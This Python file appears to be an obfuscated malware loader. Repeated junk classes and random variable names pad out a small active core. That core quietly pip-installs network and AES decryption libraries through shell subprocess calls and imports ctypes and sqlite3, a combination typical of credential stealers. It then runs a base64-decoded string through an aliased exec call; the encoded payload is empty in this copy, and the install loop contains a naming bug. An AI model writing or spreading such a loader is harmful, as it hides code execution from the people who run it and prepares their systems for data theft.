

from sys import executable, stderr
class L8uAHgz5Qs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
HJBSPJ2uMb = 19280342
YIJEL8Un4i = 49145705
ZSns6cdWXW = 6197310
class lLS5fDx2uI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class JODiqUnUyw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Pg3IHiJns9 = 49214905
sZEDIwrRte = 1963634
bJ3bgWKScS = 20334197
class lz1fcEPV01:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class t4LSKojxwt:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
LHWbjpX0Dk = 21577015
class YtCtDdzRnq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'BNRSjZWPvs'"]
class jo7VfOsj93:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'z4rGmP1', 'age': 58}
'UtDBcrEdGu'
x8pZjUwTnd = 38060460
class XU9POgb1Mi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
mUERGKwCBf = 60612007
class ivUBUVlTvK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TkmNQjak7z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
rAGBJnx4cE = 80686423
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class L8uAHgz5Qs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
HJBSPJ2uMb = 19280342
YIJEL8Un4i = 49145705
ZSns6cdWXW = 6197310
class lLS5fDx2uI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class JODiqUnUyw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Pg3IHiJns9 = 49214905
sZEDIwrRte = 1963634
bJ3bgWKScS = 20334197
class lz1fcEPV01:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class t4LSKojxwt:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
LHWbjpX0Dk = 21577015
class YtCtDdzRnq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'BNRSjZWPvs'"]
class jo7VfOsj93:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'z4rGmP1', 'age': 58}
'UtDBcrEdGu'
x8pZjUwTnd = 38060460
class XU9POgb1Mi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
mUERGKwCBf = 60612007
class ivUBUVlTvK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TkmNQjak7z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
rAGBJnx4cE = 80686423
kHiHynFXclKfCeXRxmIICdkmX2fitfAaYHx3N8 = exec
class L8uAHgz5Qs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
HJBSPJ2uMb = 19280342
YIJEL8Un4i = 49145705
ZSns6cdWXW = 6197310
class lLS5fDx2uI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class JODiqUnUyw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Pg3IHiJns9 = 49214905
sZEDIwrRte = 1963634
bJ3bgWKScS = 20334197
class lz1fcEPV01:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class t4LSKojxwt:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
LHWbjpX0Dk = 21577015
class YtCtDdzRnq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'BNRSjZWPvs'"]
class jo7VfOsj93:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'z4rGmP1', 'age': 58}
'UtDBcrEdGu'
x8pZjUwTnd = 38060460
class XU9POgb1Mi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
mUERGKwCBf = 60612007
class ivUBUVlTvK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TkmNQjak7z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
rAGBJnx4cE = 80686423
import concurrent.futures
zMQRjOmELUcnRZqqCCPmIfNZyxhhoucWEUMxLL=""
kHiHynFXclKfCeXRxmIICdkmX2fitfAaYHx3N8(base64.b64decode(zMQRjOmELUcnRZqqCCPmIfNZyxhhoucWEUMxLL))
class L8uAHgz5Qs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
HJBSPJ2uMb = 19280342
YIJEL8Un4i = 49145705
ZSns6cdWXW = 6197310
class lLS5fDx2uI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class JODiqUnUyw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Pg3IHiJns9 = 49214905
sZEDIwrRte = 1963634
bJ3bgWKScS = 20334197
class lz1fcEPV01:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class t4LSKojxwt:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
LHWbjpX0Dk = 21577015
class YtCtDdzRnq:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'BNRSjZWPvs'"]
class jo7VfOsj93:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'z4rGmP1', 'age': 58}
'UtDBcrEdGu'
x8pZjUwTnd = 38060460
class XU9POgb1Mi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
mUERGKwCBf = 60612007
class ivUBUVlTvK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TkmNQjak7z:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
rAGBJnx4cE = 80686423